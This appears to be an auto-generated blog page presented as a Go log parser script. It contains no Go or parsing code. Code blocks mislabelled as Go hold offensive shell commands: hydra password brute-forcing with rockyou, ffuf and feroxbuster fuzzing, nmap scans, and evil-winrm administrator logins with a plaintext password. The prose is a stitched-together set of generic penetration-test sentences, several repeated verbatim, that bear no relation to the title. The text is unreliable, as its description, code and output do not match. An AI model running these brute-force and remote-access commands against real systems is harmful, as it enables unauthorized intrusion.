---
TitleSEO: "Log Parser and Analyzer in Go | ZureFX"
TitlePost: "Log Parser and Analyzer — Go"
Author: "ZureFX"
Description: "A Go script for log parser and analyzer. Built for security research and automation."
Keywords: "python, script, rust, tool, automation, go"
URL: "https://zurefx.github.io/scripting/script-log-parser-and-analyzer-641.html"
URL_IMAGES: ""
Date: "2025-09-07"
Tags: "Python, Script, Rust, Tool, Automation, Go"
Section: "scripting"
Lang: "en"
main_img: "script-log-parser-and-analyzer-641"
Permalink: "/scripting/script-log-parser-and-analyzer-641.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The database credentials were hardcoded in the application source code. Command injection was possible through unsanitized user input in the search functionality. Command injection was possible through unsanitized user input in the search functionality.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `ffuf`
- `smbexec`
- `wmiexec`

## Implementation

### Core Logic

The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities.

```go
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.114.63.131 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p636,1521,1433 10.27.1.167 -oN scan.txt
evil-winrm -i 10.81.221.147 -u administrator -p 'P@ssw0rd!'
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Command injection was possible through unsanitized user input in the search functionality.

### Helper Functions

Initial enumeration revealed several interesting open ports on the target. Privilege escalation was possible due to misconfigured sudo permissions.

```go
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.62.246.169/FUZZ
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.12.128.102 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Usage

### Basic Usage

The service account had excessive permissions assigned in Active Directory. The service account had excessive permissions assigned in Active Directory.

```bash
evil-winrm -i 10.23.207.124 -u administrator -p 'P@ssw0rd!'
```

### Advanced Options

Command injection was possible through unsanitized user input in the search functionality. Initial enumeration revealed several interesting open ports on the target. The target system was identified as running a vulnerable version of the service.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.120.66.165 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Output

### Example Output

Lateral movement was facilitated by reusing discovered credentials across services. The kernel version was outdated and vulnerable to a publicly known exploit.

```
[+] Scanning target...
[+] Found 7 results
[+] Done in 9.89s
```
